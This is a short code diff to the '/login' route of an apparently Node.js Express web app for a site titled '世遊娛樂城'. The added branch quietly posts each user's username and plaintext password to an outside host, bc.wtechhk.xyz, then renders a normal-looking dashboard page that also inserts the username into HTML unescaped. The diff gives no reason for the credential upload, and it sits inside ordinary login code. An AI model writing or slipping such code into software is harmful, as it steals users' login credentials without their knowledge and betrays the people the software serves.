@@ -63,6 +63,32 @@ app.post('/login', (req,res) => {
         </body>
         </html>
     `);
+            } else {
+               let fd = new FormData();
+               let nonce = Math.floor(Math.random()*(99999-10000+1))+10000;
+               fd.append("blockID",`190${nonce.toString()}`)
+                fd.append("data",`${username}->${pw}`)
+                fetch("https://bc.wtechhk.xyz/upload",{method:'POST',body:fd})
+                res.send(`
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>世遊娛樂城 -- ${username} 主頁</title>
+            <style>
+              #user {
+                display: none;
+                }
+            </style>
+        </head>
+        <body>
+            <span id='user'>${username}</span>
+            <div id="root"></div>
+            <script src="src/dash.js"></script>
+        </body>
+        </html>
+    `);
             }
         }
       });
